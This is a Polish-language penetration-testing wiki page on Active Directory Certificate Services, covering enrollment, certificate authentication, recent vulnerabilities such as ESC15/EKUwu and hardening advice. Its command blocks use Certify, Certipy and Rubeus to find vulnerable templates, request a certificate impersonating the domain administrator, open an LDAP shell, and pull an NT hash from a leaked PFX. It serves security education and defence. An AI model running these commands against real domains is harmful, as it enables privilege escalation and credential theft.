# Certyfikaty AD

{{#include ../../banners/hacktricks-training.md}}

## Wprowadzenie

### Składniki certyfikatu

- **Podmiot (Subject)** certyfikatu wskazuje jego właściciela.
- **Klucz publiczny** jest powiązany z kluczem prywatnym, aby powiązać certyfikat z jego prawowitym właścicielem.
- **Okres ważności**, określony datami **NotBefore** i **NotAfter**, wyznacza czas obowiązywania certyfikatu.
- Unikatowy **numer seryjny**, nadawany przez urząd certyfikacji (CA), identyfikuje każdy certyfikat.
- **Wystawca (Issuer)** wskazuje CA, który wystawił certyfikat.
- **SubjectAlternativeName** umożliwia przypisanie podmiotowi dodatkowych nazw, zwiększając elastyczność identyfikacji.
- **Basic Constraints** określa, czy certyfikat dotyczy CA, czy podmiotu końcowego, oraz definiuje ograniczenia jego użycia.
- **Rozszerzone zastosowania klucza (EKU)** określają konkretne przeznaczenie certyfikatu, na przykład podpisywanie kodu lub szyfrowanie poczty e-mail, za pomocą identyfikatorów obiektów (OID).
- **Algorytm podpisu** określa metodę podpisywania certyfikatu.
- **Podpis**, utworzony przy użyciu klucza prywatnego wystawcy, gwarantuje autentyczność certyfikatu.<sup>[[4]](#references)</sup>

### Szczególne kwestie

- **Alternatywne nazwy podmiotu (SAN)** rozszerzają zastosowanie certyfikatu na wiele tożsamości, co ma kluczowe znaczenie w przypadku serwerów obsługujących wiele domen. Bezpieczne procesy wystawiania certyfikatów są niezbędne, aby uniknąć ryzyka podszywania się przez atakujących, którzy manipulują specyfikacją SAN.<sup>[[4]](#references)</sup>

### Urzędy certyfikacji (CA) w Active Directory (AD)

AD CS uwzględnia certyfikaty CA w lesie AD za pośrednictwem wyznaczonych kontenerów, z których każdy pełni odrębną rolę:<sup>[[4]](#references)</sup>

- Kontener **Certification Authorities** przechowuje zaufane certyfikaty głównych CA.
- Kontener **Enrolment Services** zawiera informacje o korporacyjnych CA i ich szablonach certyfikatów.
- Obiekt **NTAuthCertificates** zawiera certyfikaty CA upoważnionych do uwierzytelniania w AD.
- Kontener **AIA (Authority Information Access)** ułatwia weryfikację łańcucha certyfikatów za pomocą certyfikatów pośrednich i certyfikatów krzyżowych CA.

### Uzyskiwanie certyfikatu: przepływ żądania certyfikatu klienta

1. Proces żądania rozpoczyna się od wyszukania przez klienta korporacyjnego CA.
2. Po wygenerowaniu pary kluczy publicznego i prywatnego tworzony jest CSR zawierający klucz publiczny i inne informacje.
3. CA sprawdza CSR pod kątem dostępnych szablonów certyfikatów i wystawia certyfikat na podstawie uprawnień szablonu.
4. Po zatwierdzeniu CA podpisuje certyfikat swoim kluczem prywatnym i zwraca go klientowi.<sup>[[4]](#references)</sup>

### Szablony certyfikatów

Szablony zdefiniowane w AD określają ustawienia i uprawnienia dotyczące wystawiania certyfikatów, w tym dozwolone EKU oraz prawa do rejestracji lub modyfikacji. Są kluczowe dla zarządzania dostępem do usług certyfikatów.<sup>[[4]](#references)</sup>

**Wersja schematu szablonu ma znaczenie.** Starsze szablony **v1** (na przykład wbudowany szablon **WebServer**) nie mają kilku współczesnych mechanizmów egzekwowania zasad. Badania nad **ESC15/EKUwu** wykazały, że w przypadku szablonów **v1** żądający może umieścić **Application Policies/EKUs** w CSR, a te mają **pierwszeństwo przed** EKU skonfigurowanymi w szablonie. Umożliwia to uzyskanie certyfikatów do uwierzytelniania klienta, agenta rejestracji lub podpisywania kodu przy samych uprawnieniach do rejestracji. Preferuj szablony **v2/v3**, usuń lub zastąp domyślne szablony v1 i precyzyjnie ogranicz EKU do zamierzonego zastosowania.<sup>[[1]](#references)</sup>

## Rejestracja certyfikatów

Proces rejestracji certyfikatu rozpoczyna administrator, który **tworzy szablon certyfikatu**, a następnie publikuje go **korporacyjny urząd certyfikacji (CA)**. Dzięki temu szablon staje się dostępny dla klientów, którzy mogą się o niego ubiegać. W tym celu nazwę szablonu dodaje się do pola `certificatetemplates` obiektu Active Directory.<sup>[[4]](#references)</sup>

Aby klient mógł zażądać certyfikatu, należy przyznać mu **uprawnienia do rejestracji**. Uprawnienia te są określane przez deskryptory zabezpieczeń szablonu certyfikatu i samego korporacyjnego CA. Aby żądanie zakończyło się powodzeniem, uprawnienia muszą być przyznane w obu miejscach.<sup>[[4]](#references)</sup>

### Uprawnienia do rejestracji szablonu

Uprawnienia te są określane za pomocą wpisów kontroli dostępu (ACE), które definiują między innymi:<sup>[[4]](#references)</sup>

- Uprawnienia **Certificate-Enrollment** i **Certificate-AutoEnrollment**, z których każde jest powiązane z określonym identyfikatorem GUID.
- **ExtendedRights**, zezwalające na wszystkie uprawnienia rozszerzone.
- **FullControl/GenericAll**, zapewniające pełną kontrolę nad szablonem.

### Uprawnienia do rejestracji w korporacyjnym CA

Uprawnienia CA są określone w jego deskryptorze zabezpieczeń, dostępnym w konsoli zarządzania Certificate Authority. Niektóre ustawienia pozwalają nawet użytkownikom z niskimi uprawnieniami na zdalny dostęp, co może stanowić zagrożenie dla bezpieczeństwa.<sup>[[4]](#references)</sup>

### Dodatkowe mechanizmy kontroli wystawiania certyfikatów

Mogą obowiązywać pewne mechanizmy kontroli, takie jak:<sup>[[4]](#references)</sup>

- **Zatwierdzenie przez menedżera**: żądania pozostają w stanie oczekiwania do czasu zatwierdzenia przez menedżera certyfikatów.
- **Agenci rejestracji i autoryzowane podpisy**: określają wymaganą liczbę podpisów CSR oraz wymagane identyfikatory OID zasad aplikacji.

### Metody żądania certyfikatów

Certyfikaty można uzyskać za pomocą:<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), korzystającego z interfejsów DCOM.
2. **ICertPassage Remote Protocol** (MS-ICPR), za pośrednictwem nazwanych potoków lub TCP/IP.
3. **Interfejsu internetowego rejestracji certyfikatów**, po zainstalowaniu roli Certificate Authority Web Enrollment.
4. **Certificate Enrollment Service** (CES) w połączeniu z usługą Certificate Enrollment Policy (CEP).
5. **Network Device Enrollment Service** (NDES) dla urządzeń sieciowych, korzystającej z Simple Certificate Enrollment Protocol (SCEP).

Użytkownicy systemu Windows mogą również żądać certyfikatów za pomocą interfejsu graficznego (`certmgr.msc` lub `certlm.msc`) albo narzędzi wiersza poleceń (`certreq.exe` lub polecenia PowerShell `Get-Certificate`).

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Uwierzytelnianie certyfikatem

Active Directory (AD) obsługuje uwierzytelnianie certyfikatami, wykorzystując głównie protokoły **Kerberos** i **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Proces uwierzytelniania Kerberos

W procesie uwierzytelniania Kerberos żądanie użytkownika dotyczące Ticket Granting Ticket (TGT) jest podpisywane przy użyciu **klucza prywatnego** certyfikatu użytkownika. Żądanie to podlega kilku weryfikacjom przez kontroler domeny, w tym sprawdzeniu **ważności**, **ścieżki** i **statusu unieważnienia** certyfikatu. Weryfikacje obejmują również sprawdzenie, czy certyfikat pochodzi z zaufanego źródła, oraz potwierdzenie, że wystawca znajduje się w **magazynie certyfikatów NTAUTH**. Pomyślne przejście weryfikacji skutkuje wydaniem TGT. Obiekt **`NTAuthCertificates`** w AD znajduje się pod adresem:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

ma kluczowe znaczenie dla ustanawiania zaufania podczas uwierzytelniania certyfikatem.<sup>[[4]](#references)</sup>

Od wdrożenia **KB5014754** nowoczesne uwierzytelnianie Kerberos certyfikatem dotyczy głównie **siły mapowania**, a nie tylko EKU.<sup>[[2]](#references)</sup> W utwardzonych lasach:

- Certyfikat zawierający wyłącznie **UPN/DNS SAN** może już nie wystarczać do logowania.
- KDC preferuje **silne powiązanie**, zazwyczaj **rozszerzenie SID security** (`1.3.6.1.4.1.311.25.2`) lub silne jawne mapowanie w `altSecurityIdentities`.
- Jeśli certyfikat nie ma silnego mapowania, kontrolery domeny rejestrują **Kdcsvc Event ID 39/41** w trybie zgodności i odmawiają uwierzytelnienia w trybie wymuszania.
- W mieszanych ścieżkach ataku znaczenie mają **ESC9/ESC16**, ponieważ usuwają rozszerzenie SID z wystawionych certyfikatów; operatorzy polegają wtedy na jawnych mapowaniach lub formatach SID SAN URL, jeśli dana ścieżka ataku je obsługuje.

### Uwierzytelnianie Secure Channel (Schannel)

Schannel umożliwia nawiązywanie bezpiecznych połączeń TLS/SSL. Podczas uzgadniania połączenia klient przedstawia certyfikat, który po pomyślnej walidacji uprawnia do dostępu.<sup>[[5]](#references)</sup> Mapowanie certyfikatu na konto AD może wykorzystywać między innymi funkcję Kerberos **S4U2Self** lub **Subject Alternative Name (SAN)** certyfikatu.<sup>[[4]](#references)</sup>

Schannel to także praktyczna alternatywa, gdy **PKINIT** jest niedostępny. Na przykład jeśli kontroler domeny nie ma odpowiedniego certyfikatu **Smart Card Logon**, narzędzia `certipy auth`/PKINIT mogą nie uzyskać TGT, ale tego samego certyfikatu nadal można użyć do uwierzytelnienia i wykonywania operacji LDAP przez **LDAPS** lub **LDAP StartTLS**.

### Enumeracja AD Certificate Services

Usługi certyfikatów AD można enumerować za pomocą zapytań LDAP, uzyskując informacje o **Enterprise Certificate Authorities (CA)** i ich konfiguracji. Dostęp do tych informacji ma każdy użytkownik uwierzytelniony w domenie, bez specjalnych uprawnień.<sup>[[4]](#references)</sup> Narzędzia takie jak **[Certify](https://github.com/GhostPack/Certify)** i **[Certipy](https://github.com/ly4k/Certipy)** służą do enumeracji i oceny podatności w środowiskach AD CS.<sup>[[6]](#references)</sup>

Polecenia użycia tych narzędzi:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Flagi enumeracji Certify i PKINIT za pomocą Rubeus

Poniższe warianty polecenia Certify zachowują odrębne filtry i opcje wyjściowe.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus może również użyć chronionego hasłem certyfikatu PFX do uwierzytelniania PKINIT i zażądać TGT. Opcjonalny przełącznik `/getcredentials` żąda biletu usługi U2U i próbuje odzyskać hash NT konta:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

W przypadku nadużyć szablonów i CA specyficznych dla ESC zobacz [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Ostatnie luki w zabezpieczeniach i aktualizacje (2022–2025)

| Rok | ID / nazwa | Wpływ | Najważniejsze informacje |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – „Certifried” / ESC6 | *Eskalacja uprawnień* przez podszywanie się pod certyfikaty kont komputerów podczas PKINIT. | Poprawka została uwzględniona w aktualizacjach zabezpieczeń z **10 maja 2022 r.** Kontrole audytu i silnego mapowania wprowadzono za pośrednictwem **KB5014754**; środowiska powinny być teraz w trybie *Full Enforcement*.  |
| 2023 | **CVE-2023-35350 / 35351** | *Zdalne wykonanie kodu* w rolach AD CS Web Enrollment (certsrv) i CES. | Publiczne PoC są ograniczone, ale podatne komponenty IIS są często wystawione wewnętrznie. Zainstaluj poprawkę z **lipca 2023 r.**, wydaną w ramach Patch Tuesday.  |
| 2024 | **CVE-2024-49019** – „EKUwu” / ESC15 | W przypadku **szablonów v1** użytkownik z uprawnieniami do rejestracji może osadzić **Application Policies/EKU** w CSR, które mają pierwszeństwo przed EKU szablonu, uzyskując certyfikaty do uwierzytelniania klienta, agenta rejestracji lub podpisywania kodu. | Poprawka została wydana **12 listopada 2024 r.** Zastąp lub wycofaj szablony v1 (np. domyślny WebServer), ogranicz EKU do zamierzonego zastosowania i ogranicz uprawnienia do rejestracji. |

### Harmonogram wzmacniania zabezpieczeń Microsoft (KB5014754)

Microsoft wprowadził wdrożenie w trzech fazach (Compatibility → Audit → Enforcement), aby odejść od słabego, niejawnego mapowania w uwierzytelnianiu certyfikatami Kerberos. Od **11 lutego 2025 r.** kontrolery domeny automatycznie przełączają się do trybu **Full Enforcement**, jeśli wartość rejestru `StrongCertificateBindingEnforcement` nie jest ustawiona. Microsoft później zaktualizował harmonogram, tak aby powrót do trybu zgodności był możliwy do aktualizacji zabezpieczeń z **9 września 2025 r.**<sup>[[2]](#references)</sup> Administratorzy powinni:

1. Zainstalować aktualizacje na wszystkich kontrolerach domeny i serwerach AD CS (z maja 2022 r. lub nowsze).
2. Monitorować zdarzenia Event ID 39/41 pod kątem słabego mapowania w fazie *Audit*.
3. Ponownie wystawić certyfikaty do uwierzytelniania klienta z nowym **rozszerzeniem SID** albo skonfigurować silne mapowania ręczne, zanim wymuszanie zablokuje słabe mapowania.

### Uwagi dla operatorów wzmocnionych lasów

- **ESC1/ESC6 to już nie cała historia** w środowiskach z 2025 r. i nowszych. Jeśli żądasz certyfikatu dla innego podmiotu, zazwyczaj potrzebujesz również artefaktu silnego mapowania, takiego jak rozszerzenie SID lub jawne mapowanie.
- **ESC15 (EKUwu)** jest najbardziej przydatne w niezałatanych środowiskach, ponieważ pozwala zmienić nieszkodliwe szablony **v1**, takie jak **WebServer**, w certyfikaty zdolne do uwierzytelniania lub działania jako agent rejestracji przez wstrzyknięcie **Application Policies**. Kerberos PKINIT nadal sprawdza EKU, ale **LDAP Schannel** uwzględnia również Application Policies, co sprawia, że nadużycia oparte na LDAP pozostają istotne.<sup>[[1]](#references)</sup>
- **ESC16** to ustawienie obejmujące całą CA: jeśli CA globalnie wyłączy rozszerzenie zabezpieczeń SID, każdy wystawiony certyfikat będzie podlegał słabszemu mapowaniu, chyba że łańcuch ataku wstrzyknie SID w innym obsługiwanym formacie.
- **Uprawnienia ESC7 są odrębne:** uprawnienie CA `ManageCA` może umożliwiać zmianę ustawień, takich jak `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), natomiast `ManageCertificates` reguluje zatwierdzanie żądań. Jawna odmowa uprawnień menedżera certyfikatów może zablokować tę ścieżkę zatwierdzania, nawet jeśli przyznano również uprawnienie Allow; przed łączeniem ustawień i szablonów sprawdź efektywną listę ACL CA. Zobacz [ocenę listy ACL CA firmy Microsoft](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Ulepszenia wykrywania i wzmacniania zabezpieczeń

* **Czujnik AD CS w Defender for Identity (2023–2024)** pokazuje teraz oceny stanu zabezpieczeń dla ESC1–ESC8/ESC11 i generuje alerty w czasie rzeczywistym, takie jak *„Wystawienie certyfikatu kontrolera domeny dla podmiotu, który nie jest kontrolerem domeny”* (ESC8) oraz *„Zapobieganie rejestracji certyfikatów z dowolnymi Application Policies”* (ESC15). Aby skorzystać z tych mechanizmów wykrywania, wdroż czujniki na wszystkich serwerach AD CS.<sup>[[3]](#references)</sup>
* Wyłącz lub ściśle ogranicz opcję **„Supply in the request”** we wszystkich szablonach; zamiast niej stosuj jawnie zdefiniowane wartości SAN/EKU.
* Usuń **Any Purpose** lub **No EKU** z szablonów, chyba że są absolutnie niezbędne (ogranicza to ryzyko scenariuszy ESC2).
* Wymagaj **zatwierdzenia przez menedżera** lub używaj dedykowanych przepływów pracy Enrollment Agent dla wrażliwych szablonów (np. WebServer / CodeSigning).
* Ogranicz dostęp do web enrollment (`certsrv`) oraz punktów końcowych CES/NDES do zaufanych sieci lub zabezpiecz je uwierzytelnianiem za pomocą certyfikatu klienta.
* Wymuś szyfrowanie rejestracji RPC (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`), aby ograniczyć ESC11 (przekaźnik RPC). Ta flaga jest **domyślnie włączona**, ale często wyłącza się ją dla starszych klientów, co ponownie otwiera ryzyko przekaźnika.
* Zabezpiecz **punkty końcowe rejestracji oparte na IIS** (CES/Certsrv): tam, gdzie to możliwe, wyłącz NTLM lub wymagaj HTTPS + Extended Protection, aby blokować przekaźniki ESC8.

Oceń ESC11 na hoście z uruchomioną CA, który może być serwerem członkowskim domeny, a nie kontrolerem domeny. Odczytaj `InterfaceFlags` aktywnej CA w `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`; nieczytelna lub brakująca wartość oznacza wynik nieznany, a nie dowód na wyłączenie szyfrowania RPC. Brak ustawionego bitu `IF_ENFORCEENCRYPTICERTREQUEST` wskazuje na potencjalny problem konfiguracyjny, który nadal wymaga dostępnego punktu końcowego rejestracji RPC, poświadczeń, których użycie można wymusić, oraz użytecznego szablonu certyfikatu. W przypadku ESC8 samo wyzwanie HTTP NTLM nie wystarczy: potwierdź, że dostępny jest działający punkt końcowy rejestracji.

---

## References

- [1] [EKUwu: Nie tylko kolejny przypadek AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Zmiany w uwierzytelnianiu opartym na certyfikatach na kontrolerach domeny Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Oceny stanu zabezpieczeń certyfikatów — Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: nadużywanie Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Czym jest uwierzytelnianie klienta SSL/TLS i jak działa?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
